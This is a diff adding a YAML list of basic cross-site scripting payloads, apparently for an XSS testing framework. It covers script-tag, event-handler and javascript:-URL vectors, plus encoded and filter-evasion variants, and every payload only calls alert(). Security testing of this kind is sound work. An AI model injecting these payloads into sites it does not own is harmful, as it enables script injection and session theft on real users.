@@ -1,0 +1,123 @@
+# XSS Framework — Basic Payload Set
+# Classic, high-reliability vectors for common injection contexts.
+category: basic
+payloads:
+  - text: '<script>alert(1)</script>'
+    tags: [script-injection, classic]
+    description: Classic synchronous script tag
+    severity: high
+
+  - text: '<script>alert(document.cookie)</script>'
+    tags: [script-injection, cookie-exfil]
+    description: Script tag with cookie exfiltration
+    severity: high
+
+  - text: "<script>window['alert'](1)</script>"
+    tags: [script-injection, bracket-notation]
+    description: Alert via bracket notation to evade simple pattern matching
+    severity: high
+
+  - text: '<script>eval(atob("YWxlcnQoMSk="))</script>'
+    tags: [script-injection, eval, base64]
+    description: Script tag with base64-encoded eval
+    severity: high
+
+  - text: '<img src=x onerror=alert(1)>'
+    tags: [img, event-handler, attribute-event, classic]
+    description: Image onerror — no quotes, concise form
+    severity: high
+
+  - text: '<img src="x" onerror="alert(1)">'
+    tags: [img, event-handler, double-quoted]
+    description: Image onerror with double-quoted attributes
+    severity: high
+
+  - text: '<img/src=x onerror=alert(1)>'
+    tags: [img, event-handler, no-space]
+    description: Image onerror without space before src
+    severity: high
+
+  - text: '<body onload=alert(1)>'
+    tags: [body, event-handler, onload]
+    description: Body onload handler
+    severity: high
+
+  - text: '<body/onload=alert(1)>'
+    tags: [body, event-handler, onload, no-space]
+    description: Body onload without space
+    severity: high
+
+  - text: '<input autofocus onfocus=alert(1)>'
+    tags: [input, autofocus, onfocus]
+    description: Input with autofocus triggering onfocus
+    severity: high
+
+  - text: '<select autofocus onfocus=alert(1)>'
+    tags: [select, autofocus, onfocus]
+    description: Select with autofocus triggering onfocus
+    severity: medium
+
+  - text: '<textarea autofocus onfocus=alert(1)>'
+    tags: [textarea, autofocus, onfocus]
+    description: Textarea autofocus onfocus
+    severity: medium
+
+  - text: '<button onclick=alert(1)>X</button>'
+    tags: [button, onclick]
+    description: Button onclick handler
+    severity: medium
+
+  - text: '<a href="javascript:alert(1)">click</a>'
+    tags: [anchor, javascript-url, classic]
+    description: "Anchor tag with javascript: href"
+    severity: high
+
+  - text: '<a href=javascript:alert(1)>click</a>'
+    tags: [anchor, javascript-url, unquoted]
+    description: "Anchor javascript: href without quotes"
+    severity: high
+
+  - text: '<details open ontoggle=alert(1)>'
+    tags: [details, ontoggle, html5]
+    description: Details element ontoggle fires on open attribute
+    severity: high
+
+  - text: '<video autoplay onplay=alert(1)><source></video>'
+    tags: [video, autoplay, onplay, html5]
+    description: Video autoplay with onplay handler
+    severity: medium
+
+  - text: '<audio autoplay onplay=alert(1)><source></audio>'
+    tags: [audio, autoplay, onplay, html5]
+    description: Audio autoplay with onplay handler
+    severity: medium
+
+  - text: '<marquee onstart=alert(1)>x</marquee>'
+    tags: [marquee, onstart, legacy]
+    description: Marquee onstart — works in legacy browsers
+    severity: low
+
+  - text: '<iframe srcdoc="<script>alert(1)</script>">'
+    tags: [iframe, srcdoc]
+    description: Iframe srcdoc inline script
+    severity: high
+
+  - text: '<iframe src=javascript:alert(1)>'
+    tags: [iframe, javascript-url]
+    description: "Iframe javascript: src"
+    severity: high
+
+  - text: '<form><button formaction=javascript:alert(1)>X</button></form>'
+    tags: [form, formaction, javascript-url]
+    description: "Button formaction with javascript: URL"
+    severity: high
+
+  - text: '<object data=javascript:alert(1)>'
+    tags: [object, javascript-url]
+    description: "Object data attribute with javascript: URL"
+    severity: medium
+
+  - text: '<embed src=javascript:alert(1)>'
+    tags: [embed, javascript-url]
+    description: "Embed src with javascript: URL"
+    severity: medium
